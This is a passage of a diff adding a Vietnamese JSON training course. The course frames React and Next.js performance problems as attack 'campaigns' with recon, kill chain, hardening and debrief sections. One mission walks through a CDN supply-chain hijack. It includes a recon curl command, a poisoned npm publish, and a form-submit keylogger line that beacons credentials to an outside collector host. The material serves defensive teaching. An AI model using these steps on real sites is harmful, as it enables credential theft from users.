+      "objective": "Vô hiệu hóa hoàn toàn React.memo chỉ bằng props tạo mới mỗi render, đo lường thiệt hại thật qua Profiler, rồi khôi phục hiệu năng bằng useMemo/useCallback đúng chỗ.",
+      "difficulty": "advanced",
+      "estimatedMinutes": 22,
+      "vectorIds": ["rpp-vec-01"],
+      "rootCause": "React.memo so sánh props SHALLOW bằng Object.is. Về mặt kiến trúc, nó tin rằng 'props cùng tham chiếu = dữ liệu không đổi'. Mọi object/function literal trong JSX (style={{}}, onClick={() => …}, data={[...]}) đều là GIÁ TRỊ MỚI mỗi lần render cha — hợp lệ về logic, chết người về hiệu năng. Gốc rễ: JS tạo giá trị phức hợp tại biểu thức; việc 'giống nhau về nội dung' không liên quan gì đến 'cùng địa chỉ bộ nhớ'. Memoization chỉ hoạt động khi chuỗi cung ứng props ổn định từ nguồn đến đích.",
+      "reconNotes": [
+        "Profiler (Record): tìm commit có nhiều component render mà props không đổi.",
+        "Rà JSX các component được memo: có prop dạng {{...}} hoặc {() => …} inline?",
+        "Kiểm tra data từ store: selector trả object mới mỗi call (map/filter trong useSelector)?",
+        "Đếm renders bằng why-did-you-render dev build hoặc React.memo comparator tạm log."
+      ],
+      "killChain": [
+        {
+          "title": "1 · Xác lập nạn nhân",
+          "detail": "Danh sách 500 ProductRow bọc React.memo — tưởng đã an toàn.",
+          "code": "const ProductRow = memo(function ProductRow({ p, onSelect, style }) {\n  return <li style={style} onClick={() => onSelect(p.id)}>{p.name}</li>;\n});"
+        },
+        {
+          "title": "2 · Gieo storm từ component cha",
+          "detail": "Cha truyền onSelect arrow + style object inline. Mỗi keystroke ở search box: 500 cặp props mới → memo so sánh fail toàn bộ.",
+          "code": "{products.map(p => (\n  <ProductRow key={p.id} product={p}\n    onSelect={(id) => addToCart(id)} // 💀 fn mới\n    style={{ margin: 8 }} />          // 💀 obj mới\n))}"
+        },
+        {
+          "title": "3 · Đo thiệt hại thật",
+          "detail": "Profiler ghi nhận 500/500 rows re-render mỗi keystroke, commit ~60ms → typing latency vượt ngưỡng 16ms/frame, input bắt đầu gõ lag.",
+          "code": "Profiler commit #14:\n  ProductRow ×500 rendered (actualDuration 58ms)\n  trigger: \"search change\""
+        },
+        {
+          "title": "4 · Khôi phục trật tự",
+          "detail": "useCallback cho handler (deps rỗng vì chỉ gọi setter ổn định), hằng style ra ngoài component, và product prop vốn ổn định theo id — memo sống lại: chỉ row dữ liệu đổi mới re-render.",
+          "code": "const ROW_STYLE = { margin: 8 };            // module scope\nconst handleSelect = useCallback(addToCart, []);\n{products.map(p => (\n  <ProductRow key={p.id} product={p}\n    onSelect={handleSelect} style={ROW_STYLE} />\n))}\n// commit #15: ProductRow ×1 rendered 🎉"
+        }
+      ],
+      "hardeningChecklist": [
+        "Cấm object/array/function literal làm props của component memo hóa trong code review.",
+        "useCallback/useMemo chỉ khi có memo-consumer phía dưới; bừa bãi còn tốn memory hơn lợi ích.",
+        "Selector từ store trả primitive hoặc object được cache (zustand shallow compare, reselect).",
+        "Định kỳ profile flow nóng (typing/scroll) trước-sau release; đặt budget commit duration (ví dụ <8ms).",
+        "Khi memo vẫn fail dù props ổn định: kiểm tra context consumer bên trong — context thay đổi bỏ qua memo."
+      ],
+      "debrief": [
+        {
+          "question": "Vì sao không mặc định deep-compare props trong memo?",
+          "answer": "Deep-equal O(n) mỗi render mỗi component — chi phí thường lớn hơn phần render tiết kiệm. React chọn hợp đồng rẻ (tham chiếu) và để developer giữ tham chiếu ổn định khi cần tối ưu."
+        },
+        {
+          "question": "useCallback bọc mọi thứ có làm app nhanh hơn không?",
+          "answer": "Không. Mỗi callback memo hóa tốn bộ nhớ và so sánh deps. Chỉ dùng khi callback là prop của memoized child HOẶC dependency của hook khác; với DOM element thường thì vô ích."
+        }
+      ]
+    },
+    {
+      "id": "rpp-mis-02",
+      "slug": "render-body-compute-siege",
+      "title": "Chiến dịch 04 · Siege trong thân render: 10.000 dòng tính lại vì một keystroke",
+      "summary": "Filter+sort chạy ngay trong component body biến mọi render thành cơn địa chấn CPU. Đo main thread block, chuyển sang pipeline useMemo + debounce + virtualization chuẩn enterprise.",
+      "objective": "Làm treo tương tác trang bằng phép tính O(n log n) chạy lại mỗi render với cùng kết quả, chứng minh lãng phí qua profiling, và chuyển sang derivation có cache + danh sách ảo hóa.",
+      "difficulty": "advanced",
+      "estimatedMinutes": 22,
+      "vectorIds": ["rpp-vec-02"],
+      "rootCause": "Component body là HÀM được gọi lại toàn phần mỗi render — mọi tính toán viết ở đó chạy lại trừ khi được cache. Derivation nặng (filter/sort/aggregation trên tập lớn) đặt ở body biến state KHÁC (mở dropdown, hover tooltip) thành trigger recompute, dù đầu vào của phép tính không hề đổi. Main thread đơn lẻ: trong lúc compute, mọi input/click/animation xếp hàng. Đây là dạng 'self-inflicted DoS': chính app tấn công trải nghiệm người dùng của mình.",
+      "reconNotes": [
+        "Performance panel: record thao tác đơn giản, tìm task dài >50ms chứa hàm filter/sort.",
+        "Tìm pattern .filter(...).sort(...)/reduce ngay trong component body (không nằm trong useMemo/useCallback).",
+        "Đo kích thước dataset thực tế: bảng bao nhiêu row? API phân trang chưa?",
+        "Kiểm tra UI jank có tỉ lệ thuận với thao tác KHÔNG liên quan đến dữ liệu bảng không."
+      ],
+      "killChain": [
+        {
+          "title": "1 · Đặt pháo vào thân render",
+          "detail": "Bảng sản phẩm filter + sort 10.000 items trực tiếp trong body.",
+          "code": "function ProductTable({ products }) {\n  const [query, setQuery] = useState('');\n  const visible = products\n    .filter(p => p.name.includes(query))\n    .sort((a,b) => a.price - b.price); // 💀 mỗi render\n}"
+        },
+        {
+          "title": "2 · Bắn phát đầu tiên",
+          "detail": "User mở dropdown theme (không dính gì tới products) → re-render → pipeline 42ms chạy LẠI với cùng đầu vào, cùng kết quả.",
+          "code": "// open dropdown → setState(theme)\n// re-render → filter+sort AGAIN (42ms)\n// same input, same output — pure waste"
+        },
+        {
+          "title": "3 · Cảm nhận hậu quả",
+          "detail": "Main thread blocked: gõ chữ mất ký tự, animation rớt frame, scroll giật cục. Task >50ms = long task — trình duyệt không kịp vẽ khung nào trong khoảng đó.",
+          "code": "Performance recording:\n[Long Task] 48ms  ProductTable.render\n[Long Task] 44ms  ProductTable.render\n→ dropped frames during typing"
+        },
+        {
+          "title": "4 · Chuyển sang pipeline có kỷ luật",
+          "detail": "useMemo cache theo [products, query, sortDir]; query debounce 200ms; bảng lớn thêm virtualization chỉ render ~20 row visible. Commit duration giảm từ 48ms xuống dưới 3ms.",
+          "code": "const debouncedQuery = useDebouncedValue(query, 200);\nconst visible = useMemo(\n  () => products\n    .filter(p => p.name.includes(debouncedQuery))\n    .toSorted((a,b) => a.price - b.price),\n  [products, debouncedQuery, sortDir]\n);\n// + @tanstack/react-virtual cho rendering layer"
+        }
+      ],
+      "hardeningChecklist": [
+        "Derivation nặng (>1ms ước lượng) phải nằm trong useMemo với dependency TỐI THIỂU đúng nghĩa.",
+        "Input điều khiển dataset lớn dùng debounce/useDeferredValue để tách nhịp gõ khỏi nhịp tính.",
+        "Dataset > vài nghìn row hiển thị: virtualization là bắt buộc, không phải tối ưu nice-to-have.",
+        "Giữ nguyên dữ liệu gốc: dùng toSorted/toReversed (non-mutating) thay sort/reverse trực tiếp.",
+        "Budget hiệu năng per màn hình: long task >50ms phải zero trong flow chính; đưa vào perf CI."
+      ],
+      "debrief": [
+        {
+          "question": "useMemo đã cache thì còn cần virtualization không?",
+          "answer": "Có, hai tầng khác nhau: useMemo tránh TÍNH LẠI, virtualization tránh RENDER/DOM hóa hàng nghìn node. Cache giúp CPU, virtualization giúp layout/paint/memory — bỏ một bên vẫn chậm."
+        },
+        {
+          "question": "Đưa tính toán ra server/API luôn có tốt hơn?",
+          "answer": "Với dataset cực lớn và logic phức tạp: có (server-side pagination/search). Trade-off: latency mạng, chi phí hạ tầng, phức tạp. Client-side memo hợp cho tập vừa phải (<vài chục nghìn) đã load sẵn."
+        }
+      ]
+    },
+    {
+      "id": "rpp-mis-03",
+      "slug": "monolith-context-blast",
+      "title": "Chiến dịch 05 · Context khổng lồ: một cú đổi theme rung chuyển 312 component",
+      "summary": "Một AppStoreContext ôm tất cả mọi state — đổi theme khiến cả cây re-render. Phẫu thuật tách context theo domain và giới thiệu selector-based subscription.",
+      "objective": "Kích hoạt cascade re-render toàn subtree từ một field thay đổi không liên quan, đo số component vô tình re-render, rồi tái cấu trúc thành nhiều context nhỏ + selectors.",
+      "difficulty": "intermediate",
+      "estimatedMinutes": 20,
+      "vectorIds": ["rpp-vec-03"],
+      "rootCause": "Context phát tín hiệu theo NGƯỜI TIÊU THỤ, không theo FIELD: khi value thay đổi tham chiếu, MỌI component useContext() đều re-render — kể cả cái chỉ dùng 1/20 trường. Provider gom toàn bộ store vào một object (value={{...store}}) khiến mọi field đổi đều sinh tham chiếu value mới. Gốc rễ là thiết kế 'tiện một chỗ': ghép các dữ liệu có tốc độ thay đổi RẤT KHÁC NHAU (theme gần như tĩnh, notifications nhảy từng giây) vào chung một kênh phát sóng. Kết quả: độ ồn của kênh quyết định chi phí render của cả hệ thống.",
+      "reconNotes": [
+        "Tìm createContext với type bao nhiều field? Provider value={{ ...spread }}?",
+        "Đếm useContext(AppStore) trong codebase — con số này là 'bán kính nổ'.",
+        "Highlight Updates trong DevTools: đổi theme xem những component nào sáng lên.",
+        "Nhóm field theo tần suất thay đổi: static-ish (locale, theme) vs hot (cart, realtime)."
+      ],
+      "killChain": [
+        {
+          "title": "1 · Nhận diện quả bom context",
+          "detail": "AppStoreContext chứa theme/user/cart/notifications/locale; provider spread toàn bộ thành object mới mỗi update bất kỳ.",
+          "code": "<AppStoreContext.Provider value={{ ...store }}>\n  {children}\n</AppStoreContext.Provider>"
+        },
+        {
+          "title": "2 · Ghiền rồi khó cai",
+          "detail": "300+ component tiêu thụ useAppStore() không selector — tiện lấy mọi thứ, nhưng đăng ký NHẬN TÍN HIỆU CHO TOÀN BỘ store.",
+          "code": "const { cart } = useAppStore();\n// component này chỉ cần cart nhưng sẽ re-render khi theme đổi"
+        },
+        {
+          "title": "3 · Kích nổ: đổi theme",
+          "detail": "setTheme('dark') → value mới → DevTools highlight 312 component flash xanh. Chỉ Header thực sự cần theme. Commit 54ms, cảm giác app 'nặng'.",
+          "code": "toggleTheme()\n→ HighlightUpdates: 312 components flash\n→ commit took 54ms"
+        },
+        {
+          "title": "4 · Tách kênh + selector",
+          "detail": "Tách ThemeContext/CartContext riêng biệt (value primitive/memoized); nơi cần phức tạp hơn chuyển zustand selector — component subscribe đúng slice mình dùng.",
+          "code": "<ThemeContext.Provider value={theme}>…</ThemeContext.Provider>\n<CartContext.Provider value={cartItems}>…</CartContext.Provider>\n\n// hoặc zustand:\nconst cart = useStore(s => s.cart);   // ✅ narrow subscription"
+        }
+      ],
+      "hardeningChecklist": [
+        "Chia context theo DOMAIN và tần suất thay đổi; cấm context 'god store' mới.",
+        "Provider value phải là primitive, useMemo hóa object composite, hoặc tách state-setter khỏi state.",
+        "Ưu tiên zustand/Jotai selector subscription cho state global hiện đại — component chỉ re-render khi slice của nó đổi.",
+        "Memo hóa children giữa provider và consumer khi cấu trúc tĩnh (children prop không bị re-render bởi provider).",
+        "Định kỳ Highlight Updates audit các action chính: số component re-render phải tương xứng ý nghĩa."
+      ],
+      "debrief": [
+        {
+          "question": "memo() children có cứu được cascade re-render của context không?",
+          "answer": "Không. useContext đọc trực tiếp qua context — memo chỉ chặn re-render do PROPS. Component consumer sẽ re-render khi value đổi bất kể memo."
+        },
+        {
+          "question": "Vì sao tách nhiều Context provider lồng nhau vẫn OK về hiệu năng?",
+          "answer": "Mỗi context là kênh độc lập: đổi value kênh A chỉ đánh thức consumer của A. Chi phí thêm vài Provider nesting không đáng kể so với lợi ích thu hẹp bán kính re-render."
+        }
+      ]
+    },
+    {
+      "id": "rt5-mis-01",
+      "slug": "cdn-supply-chain-hijack",
+      "title": "Chiến dịch 06 · Supply Chain Hijack: một script poisoned, keylogger toàn hệ sinh thái",
+      "summary": "Mã độc không cần vào repo của bạn: walkthrough chuỗi cung ứng script từ phát hiện tag floating thiếu SRI, đầu độc @latest, keylogger capture-phase chạy đại trà, đến bộ tứ self-host + pin version + SRI + CSP.",
+      "objective": "Chứng minh một phiên bản poisoned trên public CDN đạt tới mọi user mà không thay đổi một dòng nào trong repo, harvest credentials qua form-hook capture phase, rồi thiết kế chuỗi cung ứng script có integrity verification end-to-end.",
+      "difficulty": "advanced",
+      "estimatedMinutes": 25,
+      "vectorIds": ["rt5-vec-01"],
+      "rootCause": "Script tag từ public CDN là ủy quyền code execution tuyệt đối cho một chuỗi bên thứ ba mà app không kiểm soát: maintainer account, npm registry, release pipeline, CDN cache — mỗi mắt xích là attack surface của trang bạn. Floating version (không pin) biến 'thư viện tốt hôm nay' thành con trỏ trỏ tới nội dung bất kỳ ngày mai; @latest không phải là một phiên bản, nó là một lá thư ủy quyền trắng. Thiếu SRI loại bỏ cơ chế duy nhất browser có để từ chối nội dung đã đổi: integrity hash lệch một byte là refuse-execution, còn không có hash nghĩa là chấp nhận mọi thứ. Gốc rễ kiến trúc: convenience và cache-hit toàn cầu được mua bằng integrity mà không ai ký giấy chuyển nhượng. Và khi sự cố xảy ra, mọi công cụ an ninh quen thuộc (npm audit, SBOM, code scan repo) đều quay lưng — mã độc không bao giờ nằm trong codebase.",
+      "reconNotes": [
+        "Inventory mọi script tag ngoài: CDN nào, version pinned chưa, có integrity attribute không — bảng này là bản đồ rủi ro.",
+        "Đọc CSP: script-src cho https: wildcard hoặc thiếu nghĩa là gần như mọi origin đều inject được.",
+        "Snapshot hash của script đang dùng và so định kỳ với bản known-good: diff âm thầm là alarm sớm nhất.",
+        "Rà lockfile + runtime: dependency nào tự load code qua network (dynamic import CDN) — supply chain không chỉ nằm ở <script>."
+      ],
+      "killChain": [
+        {
+          "title": "1 · Do thám nạn nhân",
+          "detail": "Quét HTML production tìm tag không pin/không SRI: mỗi tag như vậy là một cửa code execution thuê ngoài cho người lạ.",
+          "code": "$ curl -s https://target-shop.com | grep -oE '<script[^>]+src=\"[^\"]+\"[^>]*>' \\\n    | grep -v integrity\n> <script src=\"https://cdn.jsdelivr.net/npm/analytics-helper/track.min.js\"></script>\n# no version pin, no integrity — PERFECT prey"
+        },
+        {
+          "title": "2 · Đầu độc phiên bản",
+          "detail": "Chiếm maintainer account (phishing/token leak) rồi publish 'hotfix' @latest: floating tag kéo bản độc về mọi subscriber ngay lần cache-miss đầu tiên.",
+          "code": "$ npm publish --tag latest analytics-helper@1.9.1   # 'fix: memory leak'\ndiff track.min.js:\n+ document.addEventListener('submit', beacon(FormData(e.target)), true)"
+        },
+        {
+          "title": "3 · Keylogger kích hoạt đại trà",
+          "detail": "Capture-phase listener chạy TRƯỚC handler của app: email, password, OTP gõ vào bất kỳ form nào rơi vào collector trước cả khi app kịp nhìn thấy.",
+          "code": "victim submits login → capture listener fires FIRST\nbeacon → https://metrics-collect.sh/ingest (FormData: email, password)\napp login proceeds normally → user notices NOTHING"
+        },
+        {
+          "title": "4 · Thu hoạch & kéo dài thời gian sống",
+          "detail": "Cache CDN TTL giữ bản độc phục vụ thêm nhiều giờ sau khi upstream đã revert; credentials bị dùng/bán trước khi defender kịp hiểu mã độc ở đâu.",
+          "code": "upstream reverted 09:00 — CDN still serving poisoned copy (TTL 24h)\ncollected: 12.400 credential sets in first 24h\nincident response: npm audit clean, SBOM clean, repo clean — WHERE is the malware?"
+        }
+      ],
+      "hardeningChecklist": [
+        "Self-host mọi script critical: hashed filename + Cache-Control immutable — integrity nằm trong trust boundary của bạn.",
+        "Buộc dùng CDN: pin version chính xác + SRI integrity hash cho từng tag; bump version phải đi kèm regenerate + review hash.",
+        "CSP script-src whitelist origin cụ thể + hash; cấm https: wildcard và cấm thêm origin mới không qua review.",
+        "Automation: Renovate/Dependabot cho bump, CI verify SRI hash từ known-good build, periodic snapshot diff script trên CDN.",
+        "Runbook supply-chain incident: switch self-hosted → rotate mọi credential có thể đi qua form bị hook → force CDN purge → forensic client telemetry."
+      ],
+      "debrief": [
+        {
+          "question": "SRI hoạt động thế nào và giới hạn của nó ở đâu?",
+          "answer": "Browser hash nội dung response rồi so với integrity attribute — lệch một byte là refuse execute. Giới hạn: chỉ phủ script/link tĩnh (không che dynamic import), và hash phải được cập nhật đúng mỗi lần bump — quy trình quên đồng bộ hash sẽ tự làm chết trang."
+        },
+        {
+          "question": "Self-host mất CDN cache toàn cầu, có đáng không?",
+          "answer": "Đáng, với script critical: mất cache chia sẻ chéo site được bù bằng HTTP cache dài-lived + hashed filename trên origin/CDN riêng của bạn. Trade-off thật sự là availability của origin bạn — thứ nằm trong tầm kiểm soát, khác với integrity của bên thứ ba."
+        }
+      ]
+    }
+  ],
+  "dossier": {
+    "readingTimeMinutes": 18,
+    "objectives": [
+      "Dựng waterfall RSC bằng await tuần tự và chứng minh latency cộng dồn so với Promise.all song song.",
+      "Biến route thành bão dynamic rendering với force-dynamic cộng no-store toàn cục và đo throughput sụp đổ.",
+      "Khai thác identity storm phá React.memo bằng props mới mỗi render và compute siege bằng filter sort 10k rows ngay trong render.",
+      "Kích context blast từ context monolithic rồi vá theo tầng: fetch song song, static-first, memoization đúng biên, context tách lát."
+    ],
+    "concepts": [
+      {
+        "term": "Waterfall tuần tự",
+        "definition": "await fetch A xong mới await fetch B trong server component khiến tổng latency bằng tổng A cộng B dù hai fetch độc lập. Nhân theo số widget là dashboard chậm cấp số nhân. Song song hóa bằng Promise.all hoặc preload pattern khởi động fetch từ layer cha ép tổng về bằng max."
+      },
+      {
+        "term": "Static versus dynamic rendering",
+        "definition": "Next.js render tĩnh khi route không dùng dynamic API; phủ force-dynamic và fetch no-store đại trà biến mỗi request thành render từ đầu cộng origin hit. CPU server và DB chịu tải nhân theo traffic, TTFB leo thang. Quyết định động hay tĩnh phải theo từng segment dữ liệu, không sơn kín route."
+      },
+      {
+        "term": "Referential identity",
+        "definition": "React.memo so sánh props nông bằng ===; object, array, function tạo mới mỗi render khiến memo vô dụng và con re-render dù nội dung không đổi. Identity storm lan theo cây: mỗi lần cha render kéo theo dãy con giả thay đổi. useMemo, useCallback và stable reference là vật tư chiến lược dùng đúng ở biên giới memo."
+      },
+      {
+        "term": "Compute siege trong render",
+        "definition": "Filter, sort, aggregation 10 nghìn rows ngay trong thân render chạy lại ở mọi lần render: main thread kẹt, INP sụp, frame vượt ngân sách 16ms. Render phải rẻ: computation nặng đẩy vào useMemo khóa theo deps, web worker, hoặc precompute tận server và database."
+      },
+      {
+        "term": "Context blast",
+        "definition": "Context đổi value thì mọi consumer re-render bất kể dùng phần nào; context monolithic gộp user, theme, cart, i18n biến mỗi keystroke thành bão toàn app. Value của Provider còn phải được memoize — object mới mỗi render gây bão ngay cả khi state không đổi. Tách context theo tần suất thay đổi là phòng tuyến kiến trúc."
+      }
+    ],
+    "attackerPlaybook": [
+      {
+        "title": "Vẽ bản đồ dòng chảy",
+        "detail": "Trace từng route: fetch nào await tuần tự, segment nào force-dynamic hoặc no-store, context nào bọc toàn app. Đo baseline: TTFB, số render mỗi keystroke bằng Profiler, CPU khi render."
+      },
+      {
+        "title": "Kích waterfall và dynamic storm",
+        "detail": "Chèn delay nhân tạo vào các fetch độc lập để chứng minh latency cộng dồn; bật force-dynamic toàn cục rồi load-test để thấy throughput sụp và origin gánh 100 phần trăm request."
+      },
+      {
+        "title": "Bắn identity storm và compute siege",
+        "detail": "Truyền object và function mới mỗi render vào component con có memo, dùng Profiler chỉ ra flame render vô nghĩa. Đưa dataset 10k rows vào filter sort trong render, đo long task và INP; gõ một ký tự vào context monolith để thấy blast radius."
+      },
+      {
+        "title": "Vá theo tầng và đo lại",
+        "detail": "Promise.all cộng preload pattern, static-first với dynamic island theo segment, memoization đúng biên memo, computation nặng ra useMemo và worker, context tách lát với value memoized. Load-test lại và trình bày số liệu cải thiện định lượng."
+      }
+    ],
+    "defensePrinciples": [
+      "Fetch độc lập phải chạy song song bằng Promise.all hoặc preload pattern; cấm await nối tiếp những gì có thể chạy cùng lúc.",
+      "Static-first: chỉ đánh dấu dynamic đúng segment cần thiết; cấm force-dynamic và no-store áp dụng kiểu sơn toàn bộ route.",
+      "Biên giới memo phải ăn identity ổn định: props vào memo là useMemo, useCallback hoặc stable ref; computation nặng nằm ở useMemo, worker, server — render chỉ lắp JSX.",
+      "Context thiết kế theo lát mỏng với value memoized; dữ liệu quy mô server không đi qua React context mà dùng store hoặc query library có selector."
+    ]
+  }
+}
